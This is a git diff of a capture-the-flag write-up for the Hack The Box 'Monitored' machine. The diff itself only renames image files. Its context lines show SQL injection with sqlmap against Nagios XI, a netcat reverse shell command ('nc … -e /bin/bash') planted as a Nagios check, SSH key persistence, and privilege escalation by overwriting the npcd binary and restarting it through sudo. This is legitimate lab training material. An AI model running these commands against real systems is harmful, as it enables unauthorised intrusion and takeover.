@@ -4,7 +4,7 @@
 
 This writeup details the exploitation process of the "Monitored" box on Hack The Box. The challenge is categorized as medium difficulty and involves several stages, from initial access via SNMP enumeration to gaining root access through service misconfiguration.
 
-<figure><img src="../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (33) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Enumeration
 
@@ -14,7 +14,7 @@ This writeup details the exploitation process of the "Monitored" box on Hack The
 sudo nmap -A -sC -sU -sV -Pn 10.10.11.248
 ```
 
-<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (40) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Adding Domain to Hosts File
 
@@ -28,13 +28,13 @@ echo "10.10.11.248 nagios.monitored.htb" | sudo tee -a /etc/hosts
 dirsearch -u https://nagios.monitored.htb/nagiosxi/
 ```
 
-<figure><img src="../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (35) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 dirsearch -u https://nagios.monitored.htb/nagiosxi/api/v1
 ```
 
-<figure><img src="../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (36) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploitation
 
@@ -75,16 +75,16 @@ sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelpe
 * Login as USERNAME:PASSWORD
 * Go the desktop dashboard
 
-<figure><img src="../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (37) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * go https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php
 
-<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Find command tab
 * Add new command
 
-<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (39) (1).png" alt=""><figcaption></figcaption></figure>
 
 * nc \<YOUR\_IP> \<YOUR\_PORT> -e /bin/bash
 * Run check command
@@ -92,7 +92,7 @@ sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelpe
 
 ### User Flag
 
-<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (41) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Cat user.txt ~~e9eaf8e812a59f17bcae9f18b37b4509~~
 
@@ -119,7 +119,7 @@ echo 'your_public_ssh_key' >> ~/.ssh/authorized_keys
 ssh username@victim_server_ip
 </code></pre>
 
-<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (42) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Create LinPEAS.sh:
 
@@ -138,7 +138,7 @@ scp test.sh nagios@IP:/home/nagios
 ./test.sh
 ```
 
-<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (43) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 nano /usr/local/nagios/bin/npcd
@@ -153,13 +153,13 @@ chmod +x /usr/local/nagios/bin/npcd
 We don't know how to restart `npcd` service, let try `sudo -l`
 ```
 
-<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (44) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
 ```
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (45) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Root Flag
 
